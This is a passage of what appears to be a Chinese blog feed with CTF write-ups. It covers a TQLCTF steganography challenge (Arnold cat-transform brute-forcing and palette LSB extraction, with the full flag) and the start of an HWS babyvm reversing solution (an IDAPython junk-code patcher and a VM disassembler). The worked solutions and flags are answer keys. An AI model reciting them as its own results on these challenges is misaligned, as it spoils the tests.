class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_png</span>(<span class="params">alldata</span>):</span></span><br><span class="line">    idx_start = alldata.index(<span class="string">b&#x27;\x89\x50\x4E\x47&#x27;</span>)</span><br><span class="line">    idx_end = alldata.index(<span class="string">b&#x27;\xAE\x42\x60\x82&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> idx_start, idx_end + <span class="number">4</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;Cat&amp;Soup.zip&#x27;</span>, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    data = f.read()</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;cat.png&#x27;</span>, <span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    start, end = get_png(data)</span><br><span class="line">    f.write(data[start:end])</span><br><span class="line">    data = data[end:]</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;soup.png&#x27;</span>, <span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    start, end = get_png(data)</span><br><span class="line">    f.write(data[start:end])</span><br><span class="line">    data = data[end:]</span><br></pre></td></tr></table></figure><p>拿到两张图<code>cat.png</code>和<code>soup.png</code>，用exiftool、pngcheck等一堆工具都没看出有什么线索（果然这道题不是一道工具题呢x），用Stegsolve翻能翻到两张图片的某些颜色通道有很明显的水印。由题目的提示可以知道cat和soup的处理方式是不一样的，所以可以分开解析。</p><h3 id="Cat"><a href="#Cat" class="headerlink" title="Cat"></a>Cat</h3><p>用Stegsolve可以看到在Red plane 0、Green plane 0、Blue plane 0都有这种点状水印。</p><p><img src="/p/wpFor-2022TQLCTF/image-20220224153305986.png"></p><p>把有水印的三个通道提取出来，可以写脚本也可以直接用Stegsolve的提取功能</p><p><img src="/p/wpFor-2022TQLCTF/image-20220224153633504.png"></p><p>分别保存成<code>red.bmp</code>、<code>green.bmp</code>、<code>blue.bmp</code>，然后对这几张图片分别进行cat变换即可，但是参数未知。（比赛的时候一直以为是逆变换，人傻了属于是x</p><p>我自己写的cat变换部分代码，暴力遍历每个像素确定新的位置：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(width): <span class="comment">#i -&gt; y, j -&gt; x</span></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(height):</span><br><span class="line">        new_i = (i + a*j) % width</span><br><span class="line">        new_j = (j + b*new_i) % height</span><br><span class="line">        res_img[new_j, new_i] = img[j, i]</span><br></pre></td></tr></table></figure><p>但是爆破参数的时候发现这个代码出奇的慢，爆破大范围的时候实在是接受不了，所以仿出题人给的脚本改了一下：（我也不知道为什么这样比较快，难道numpy库内部加了一些特殊处理来加速吗）</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">arnold</span>(<span class="params">im_file, a, b</span>):</span></span><br><span class="line">    img = np.array(Image.<span class="built_in">open</span>(im_file))</span><br><span class="line">    height, width, color = img.shape</span><br><span class="line">    res_img = np.zeros((height, width, color), dtype=<span class="built_in">int</span>) <span class="comment"># 横向变换，右移</span></span><br><span class="line">    step = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(height):</span><br><span class="line">        <span class="keyword">if</span> step == <span class="number">0</span>:</span><br><span class="line">            res_img[j] = img[j]</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            res_img[j, :step] = img[j, -step:]</span><br><span class="line">            res_img[j, step:] = img[j, :-step]</span><br><span class="line">        step = (step+a) % width</span><br><span class="line">    img = res_img</span><br><span class="line">    res_img = np.zeros((height, width, color), dtype=<span class="built_in">int</span>) <span class="comment"># 纵向变换，下移</span></span><br><span class="line">    step = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(width):</span><br><span class="line">        <span class="keyword">if</span> step == <span class="number">0</span>:</span><br><span class="line">            res_img[:, i] = img[:, i]</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            res_img[:step, i] = img[-step:, i]</span><br><span class="line">            res_img[step:, i] = img[:-step, i]</span><br><span class="line">        step = (step+b) % height</span><br><span class="line">    <span class="comment"># for i in range(width): #i -&gt; y, j -&gt; x</span></span><br><span class="line">    <span class="comment">#     for j in range(height):</span></span><br><span class="line">    <span class="comment">#         new_i = (i + a*j) % width</span></span><br><span class="line">    <span class="comment">#         new_j = (j + b*new_i) % height</span></span><br><span class="line">    <span class="comment">#         res_img[new_j, new_i] = img[j, i]</span></span><br><span class="line">    Image.fromarray(np.uint8(res_img)).save(<span class="string">&#x27;output_&#123;&#125;/res_a&#123;&#125;_b&#123;&#125;.png&#x27;</span>.<span class="built_in">format</span>(im_file[:im_file.index(<span class="string">&#x27;.&#x27;</span>)], a, b))</span><br></pre></td></tr></table></figure><p>爆破参数从横向变换的参数a开始爆破，纵向变换参数b设成0。这里以爆破red通道参数为例。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 主函数，先爆b=0时的a</span></span><br><span class="line"><span class="keyword">for</span> tmpa <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">500</span>):</span><br><span class="line">    arnold(<span class="string">&#x27;red.bmp&#x27;</span>, tmpa, <span class="number">0</span>)</span><br></pre></td></tr></table></figure><p><del>范围不一定是500哈，没看到合适的得接着往后爆</del></p><p>爆破完以后可以在output_red文件夹（当然这个文件夹需要事先创建）中看到非——常多让人眼花缭乱的图。</p><p><img src="/p/wpFor-2022TQLCTF/image-20220224154744429.png"></p><p>一张张翻过去（亲身经历五百张很快的，看到不对翻过去就得了）。</p><p>看到三张连续的这样的图说明参数找到了</p><p><img src="/p/wpFor-2022TQLCTF/image-20220224155809335.png"></p><p>300有很明显的斜率k&#x3D;1的斜线、301有明显的线条（在前面图案里没见过的）、302是斜率k&#x3D;-1的斜线，在300-302之间有一个从上升变到下降的过程，说明a很有可能就是中间的301，就是出题人wp里说的爆破方法：</p><p><img src="/p/wpFor-2022TQLCTF/image-20220224155300600.png"></p><p>爆出a&#x3D;301以后，接着爆破b，就能看到很明显的有flag的图片（其实不用染色也挺明显的</p><p><img src="/p/wpFor-2022TQLCTF/image-20220224155447582.png"></p><p>拿到了红色通道隐藏的开头部分flag。</p><p>绿色通道爆破a的图像：</p><p><img src="/p/wpFor-2022TQLCTF/image-20220224155954181.png"></p><p>蓝色通道爆破a的图像：</p><p><img src="/p/wpFor-2022TQLCTF/image-20220224155643774.png"></p><p>最后拿到了三只小猫的图像（爆破a参数看到眼要瞎了哈哈哈哈，b参数的爆破倒是没有难度）</p><p><img src="/p/wpFor-2022TQLCTF/image-20220224160234153.png"></p><p>想知道参数的朋友直接看上图↑文件名就可）</p><p>前半段flag：<strong>TQLCTF{I_H@V3_a_LOt_oF_c4t5_t</strong></p><h3 id="Soup"><a href="#Soup" class="headerlink" title="Soup"></a>Soup</h3><p>感觉题目第一个提示说的”和soup有关“应该是来源于npy<a href="https://tover.xyz/">@Tover</a> 找的这篇论文：<a href="https://supercomputingchallenge.org/02-03/finalReports/022.pdf">Waiter! There’s a Message in My Soup</a>，里面同样提到了提示2说的调色板隐写算法。</p><p>调色板隐写算法的描述：（来自文章<a href="http://www.cqvip.com/qk/95033x/200622/23338153.html">《EzStego的嵌入、提取与检测的C++实现》</a>）</p><p><img src="/p/wpFor-2022TQLCTF/image-20220224211232580.png"></p><p>然后就是按着写脚本啦，本题是7位组成一个字节（看到隐写数据里1打头就要警觉了），然后把flag隐写了无数次直到图片末尾。</p><p><img src="/p/wpFor-2022TQLCTF/image-20220224212013690.png"></p><p>出题人wp里用了一个很巧妙的方法来检查循环的数据串（学到了+1</p><p><img src="/p/wpFor-2022TQLCTF/image-20220224212136230.png"></p><p><del>（如果是我的话估计会把所有都print出来然后人眼看）</del></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"></span><br><span class="line">img = Image.<span class="built_in">open</span>(<span class="string">&#x27;soup.png&#x27;</span>)</span><br><span class="line">width, height = img.size</span><br><span class="line"><span class="comment"># 获得调色板索引</span></span><br><span class="line">palette = img.getpalette()</span><br><span class="line">palette = [palette[i:i+<span class="number">3</span>] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(palette), <span class="number">3</span>)]</span><br><span class="line">luminance = [<span class="number">0.299</span> * t[<span class="number">0</span>] + <span class="number">0.587</span> * t[<span class="number">1</span>] + <span class="number">0.114</span> * t[<span class="number">2</span>] <span class="keyword">for</span> t <span class="keyword">in</span> palette]</span><br><span class="line">idx0 = np.argsort(luminance)</span><br><span class="line">idx1 = [<span class="number">0</span>] * <span class="number">256</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(idx0)):</span><br><span class="line">    idx1[idx0[i]] = i</span><br><span class="line"></span><br><span class="line"><span class="comment"># 提取lsb</span></span><br><span class="line">data = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(width):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(height):</span><br><span class="line">        x = img.getpixel((i, j))</span><br><span class="line">        data += <span class="built_in">str</span>(idx1[x] % <span class="number">2</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># now这里抄的出题人wp，不用now也行</span></span><br><span class="line">now = <span class="number">1</span></span><br><span class="line"><span class="keyword">while</span> data[now:] != data[:-now]:</span><br><span class="line">    now += <span class="number">1</span></span><br><span class="line"><span class="comment"># print(data)</span></span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, now, <span class="number">7</span>):</span><br><span class="line">    tmp = data[i:i+<span class="number">7</span>]</span><br><span class="line">    flag += <span class="built_in">chr</span>(<span class="built_in">int</span>(tmp, <span class="number">2</span>))</span><br><span class="line">print(flag)</span><br></pre></td></tr></table></figure><p><img src="/p/wpFor-2022TQLCTF/image-20220224212557782.png"></p><p>拿到后半段flag：<strong>HeR3_4R3_$oooOo0_CU7e!}</strong></p><p>拼起来就能拿到整个flag：<strong>TQLCTF{I_H@V3_a_LOt_oF_c4t5_tHeR3_4R3_$oooOo0_CU7e!}</strong></p><p>最后前线第一报道：某个Tover在比赛第二天的时候为了截图看跟题目的区别，把游戏下下来玩了，结果越玩越上瘾 <del>，甚至无心工作（</del></p><p>”这游戏有什么好玩的啊“</p><p>（然后真香</p><p><img src="/p/wpFor-2022TQLCTF/image-20220224212838325.png"></p>]]></content>
      
      
      <categories>
          
          <category> Write up </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Reverse </tag>
            
            <tag> Misc </tag>
            
            <tag> wp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【wp】HWS计划2022硬件安全冬令营线上选拔赛</title>
      <link href="p/wpFor-2022HWSTrial/"/>
      <url>p/wpFor-2022HWSTrial/</url>
      
        <content type="html"><![CDATA[<p>昨天打完的选拔赛，超级无敌难得过来及时更新（被好多师傅催来着哈哈哈，ddl第一生产力。</p><p>只能说这次比赛太幸运了，能碰到这么多逆向题，<del>甚至还有两道流落在Misc和Crypto的apk</del>，相对来说没什么固件题（固件好菜，RW嗑了八个多小时没嗑出来TAT），那肯定开冲√</p><p>感谢师傅们手下留情╰(*°▽°*)╯</p><a id="more"></a><p><img src="/p/wpFor-2022HWSTrial/image-20220125222610060.png"></p><h1 id="Reverse"><a href="#Reverse" class="headerlink" title="Reverse"></a>Reverse</h1><h2 id="babyvm"><a href="#babyvm" class="headerlink" title="babyvm"></a>babyvm</h2><p>vm签到题，这个题做完以后看到是一血人都傻了，<del>看到easyvm已经三血开外了人就更傻了，明明应该baby比easy简单的吧</del></p><p>一些简单粗暴的花指令</p><p><img src="/p/wpFor-2022HWSTrial/image-20220124230108761.png"></p><p>花指令有点多，直接idapython走起</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> idc_bc695 <span class="keyword">import</span> *</span><br><span class="line">start_addr = <span class="number">0x00412CC0</span></span><br><span class="line">end_addr = <span class="number">0x00413991</span></span><br><span class="line">l = [<span class="number">0x74</span>, <span class="number">0x03</span>, <span class="number">0x75</span>, <span class="number">0x01</span>, <span class="number">0xE8</span>]</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">myNop</span>(<span class="params">addr, end</span>):</span></span><br><span class="line">    <span class="keyword">while</span> addr &lt; end:</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(l)):</span><br><span class="line">            <span class="keyword">if</span> idc.get_wide_byte(addr + i) != l[i]:</span><br><span class="line">                addr += <span class="number">1</span></span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(l)):</span><br><span class="line">                PatchByte(addr, <span class="number">0x90</span>)</span><br><span class="line">                addr += <span class="number">1</span></span><br><span class="line">    print(<span class="string">&quot;[+] nop ok!!&quot;</span>)</span><br><span class="line">myNop(start_addr, end_addr)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(start_addr, end_addr + <span class="number">1</span>):</span><br><span class="line">    MakeUnkn(i, <span class="number">0x90</span>)</span><br></pre></td></tr></table></figure><p>去完花以后可以看到主函数直接跳到vm</p><p><img src="/p/wpFor-2022HWSTrial/image-20220124224524473.png"></p><p><img src="/p/wpFor-2022HWSTrial/image-20220124224611724.png"></p><p>而查vm的交叉引用可以发现有四个地方都用到了vm函数，说明opcode实际上分成了四段（四个起点）</p><p>逐个逆出32个case的作用，dump出opcode（opcode以qword为单位，偏移这边都是+8&#x2F;+16这样），写反汇编器</p><p>（反汇编器模板在：<a href="https://github.com/c10udlnk/myReverseExps/blob/main/VMprotect/VMinterpreter.py">myReverseExps&#x2F;VMinterpreter.py at main · c10udlnk&#x2F;myReverseExps</a>，不过很久没改过了，每次都是做题的时候拉下来现改，有空再把新版放上去吧hhhh）</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line">ins_set=&#123; <span class="number">0</span>: [<span class="number">3</span>, <span class="number">2</span>, <span class="string">&quot;mov arr[r&#123;0&#125;], 0x&#123;1:0&gt;4X&#125;&quot;</span>],</span><br><span class="line">          <span class="number">1</span>: [<span class="number">3</span>, <span class="number">2</span>, <span class="string">&quot;mov r&#123;0&#125;, 0x&#123;1:0&gt;4X&#125;&quot;</span>],</span><br><span class="line">          <span class="number">2</span>: [<span class="number">3</span>, <span class="number">2</span>, <span class="string">&quot;mov r&#123;0&#125;, r&#123;1&#125;&quot;</span>],</span><br><span class="line">          <span class="number">3</span>: [<span class="number">3</span>, <span class="number">2</span>, <span class="string">&quot;mov r&#123;0&#125;, arr[r&#123;1&#125;]&quot;</span>],</span><br><span class="line">          <span class="number">4</span>: [<span class="number">3</span>, <span class="number">2</span>, <span class="string">&quot;mov arr[r&#123;0&#125;], r&#123;1&#125;&quot;</span>],</span><br><span class="line">          <span class="number">5</span>: [<span class="number">3</span>, <span class="number">1</span>, <span class="string">&quot;push r&#123;0&#125;&quot;</span>],</span><br><span class="line">          <span class="number">6</span>: [<span class="number">3</span>, <span class="number">1</span>, <span class="string">&quot;pop r&#123;0&#125;&quot;</span>],</span><br><span class="line">          <span class="number">7</span>: [<span class="number">3</span>, <span class="number">2</span>, <span class="string">&quot;add r&#123;0&#125;, 0x&#123;1:0&gt;4X&#125;&quot;</span>],</span><br><span class="line">          <span class="number">8</span>: [<span class="number">3</span>, <span class="number">2</span>, <span class="string">&quot;add r&#123;0&#125;, r&#123;1&#125;&quot;</span>],</span><br><span class="line">          <span class="number">9</span>: [<span class="number">3</span>, <span class="number">2</span>, <span class="string">&quot;sub r&#123;0&#125;, 0x&#123;1:0&gt;4X&#125;&quot;</span>],</span><br><span class="line">         <span class="number">10</span>: [<span class="number">3</span>, <span class="number">2</span>, <span class="string">&quot;sub r&#123;0&#125;, r&#123;1&#125;&quot;</span>],</span><br><span class="line">         <span class="number">11</span>: [<span class="number">3</span>, <span class="number">2</span>, <span class="string">&quot;mul r&#123;0&#125;, 0x&#123;1:0&gt;4X&#125;&quot;</span>],</span><br><span class="line">         <span class="number">12</span>: [<span class="number">3</span>, <span class="number">2</span>, <span class="string">&quot;mul r&#123;0&#125;, r&#123;1&#125;&quot;</span>],</span><br><span class="line">         <span class="number">13</span>: [<span class="number">3</span>, <span class="number">2</span>, <span class="string">&quot;shl r&#123;0&#125;, 0x&#123;1:0&gt;4X&#125;&quot;</span>],</span><br><span class="line">         <span class="number">14</span>: [<span class="number">3</span>, <span class="number">2</span>, <span class="string">&quot;shl r&#123;0&#125;, r&#123;1&#125;&quot;</span>],</span><br><span class="line">         <span class="number">15</span>: [<span class="number">3</span>, <span class="number">2</span>, <span class="string">&quot;shr r&#123;0&#125;, 0x&#123;1:0&gt;4X&#125;&quot;</span>],</span><br><span class="line">         <span class="number">16</span>: [<span class="number">3</span>, <span class="number">2</span>, <span class="string">&quot;shr r&#123;0&#125;, r&#123;1&#125;&quot;</span>],</span><br><span class="line">         <span class="number">17</span>: [<span class="number">3</span>, <span class="number">2</span>, <span class="string">&quot;xor r&#123;0&#125;, 0x&#123;1:0&gt;4X&#125;&quot;</span>],</span><br><span class="line">         <span class="number">18</span>: [<span class="number">3</span>, <span class="number">2</span>, <span class="string">&quot;xor r&#123;0&#125;, r&#123;1&#125;&quot;</span>],</span><br><span class="line">         <span class="number">19</span>: [<span class="number">3</span>, <span class="number">2</span>, <span class="string">&quot;or r&#123;0&#125;, 0x&#123;1:0&gt;4X&#125;&quot;</span>],</span><br><span class="line">         <span class="number">20</span>: [<span class="number">3</span>, <span class="number">2</span>, <span class="string">&quot;or r&#123;0&#125;, r&#123;1&#125;&quot;</span>],</span><br><span class="line">         <span class="number">21</span>: [<span class="number">3</span>, <span class="number">2</span>, <span class="string">&quot;and r&#123;0&#125;, 0x&#123;1:0&gt;4X&#125;&quot;</span>],</span><br><span class="line">         <span class="number">22</span>: [<span class="number">3</span>, <span class="number">2</span>, <span class="string">&quot;and r&#123;0&#125;, r&#123;1&#125;&quot;</span>],</span><br><span class="line">         <span class="number">23</span>: [<span class="number">3</span>, <span class="number">1</span>, <span class="string">&quot;mov r&#123;0&#125;, getchar()&quot;</span>],</span><br><span class="line">         <span class="number">24</span>: [<span class="number">3</span>, <span class="number">1</span>, <span class="string">&quot;putchar(r&#123;0&#125;)&quot;</span>],</span><br><span class="line">         <span class="number">25</span>: [<span class="number">3</span>, <span class="number">0</span>, <span class="string">&quot;exit&quot;</span>],</span><br><span class="line">         <span class="number">26</span>: [<span class="number">3</span>, <span class="number">2</span>, <span class="string">&quot;cmp r&#123;0&#125;, 0x&#123;1:0&gt;4X&#125;&quot;</span>],</span><br><span class="line">         <span class="number">27</span>: [<span class="number">3</span>, <span class="number">2</span>, <span class="string">&quot;cmp r&#123;0&#125;, r&#123;1&#125;&quot;</span>],</span><br><span class="line">         <span class="number">28</span>: [<span class="number">3</span>, <span class="number">1</span>, <span class="string">&quot;jz &#123;0:0&gt;3&#125;&quot;</span>],</span><br><span class="line">         <span class="number">29</span>: [<span class="number">3</span>, <span class="number">1</span>, <span class="string">&quot;jmp &#123;0:0&gt;3&#125;&quot;</span>],</span><br><span class="line">         <span class="number">30</span>: [<span class="number">3</span>, <span class="number">1</span>, <span class="string">&quot;jl &#123;0:0&gt;3&#125;&quot;</span>],</span><br><span class="line">         <span class="number">31</span>: [<span class="number">3</span>, <span class="number">1</span>, <span class="string">&quot;jnz &#123;0:0&gt;3&#125;&quot;</span>]&#125;</span><br><span class="line">opcode = [<span class="number">18</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">18</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">18</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">18</span>, <span class="number">3</span>, <span class="number">3</span>, <span class="number">18</span>, <span class="number">6</span>, <span class="number">6</span>, <span class="number">18</span>, <span class="number">7</span>, <span class="number">7</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">105</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">110</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">112</span>, <span class="number">1</span>, <span class="number">3</span>, <span class="number">117</span>, <span class="number">1</span>, <span class="number">6</span>, <span class="number">116</span>, <span class="number">1</span>, <span class="number">7</span>, <span class="number">32</span>, <span class="number">24</span>, <span class="number">0</span>, <span class="number">18446744073709551615</span>, <span class="number">24</span>, <span class="number">1</span>, <span class="number">18446744073709551615</span>, <span class="number">24</span>, <span class="number">2</span>, <span class="number">18446744073709551615</span>, <span class="number">24</span>, <span class="number">3</span>, <span class="number">18446744073709551615</span>, <span class="number">24</span>, <span class="number">6</span>, <span class="number">18446744073709551615</span>, <span class="number">24</span>, <span class="number">7</span>, <span class="number">18446744073709551615</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">102</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">108</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">97</span>, <span class="number">1</span>, <span class="number">3</span>, <span class="number">103</span>, <span class="number">1</span>, <span class="number">6</span>, <span class="number">58</span>, <span class="number">1</span>, <span class="number">7</span>, <span class="number">32</span>, <span class="number">24</span>, <span class="number">0</span>, <span class="number">18446744073709551615</span>, <span class="number">24</span>, <span class="number">1</span>, <span class="number">18446744073709551615</span>, <span class="number">24</span>, <span class="number">2</span>, <span class="number">18446744073709551615</span>, <span class="number">24</span>, <span class="number">3</span>, <span class="number">18446744073709551615</span>, <span class="number">24</span>, <span class="number">6</span>, <span class="number">18446744073709551615</span>, <span class="number">24</span>, <span class="number">7</span>, <span class="number">18446744073709551615</span>, <span class="number">18</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">23</span>, <span class="number">0</span>, <span class="number">18446744073709551615</span>, <span class="number">5</span>, <span class="number">0</span>, <span class="number">18446744073709551615</span>, <span class="number">7</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">26</span>, <span class="number">1</span>, <span class="number">38</span>, <span class="number">30</span>, <span class="number">31</span>, <span class="number">18446744073709551615</span>, <span class="number">25</span>, <span class="number">18446744073709551615</span>, <span class="number">18446744073709551615</span>, <span class="number">18</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">255</span>, <span class="number">7</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">547</span>, <span class="number">7</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">571</span>, <span class="number">7</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">567</span>, <span class="number">7</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">567</span>, <span class="number">7</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">587</span>, <span class="number">7</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">555</span>, <span class="number">7</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">251</span>, <span class="number">7</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">555</span>, <span class="number">7</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">547</span>, <span class="number">7</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">591</span>, <span class="number">7</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">239</span>, <span class="number">7</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">567</span>, <span class="number">7</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">239</span>, <span class="number">7</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">591</span>, <span class="number">7</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">591</span>, <span class="number">7</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">547</span>, <span class="number">7</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">547</span>, <span class="number">7</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">571</span>, <span class="number">7</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">567</span>, <span class="number">7</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">255</span>, <span class="number">7</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">563</span>, <span class="number">7</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">563</span>, <span class="number">7</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">0</span>, <span 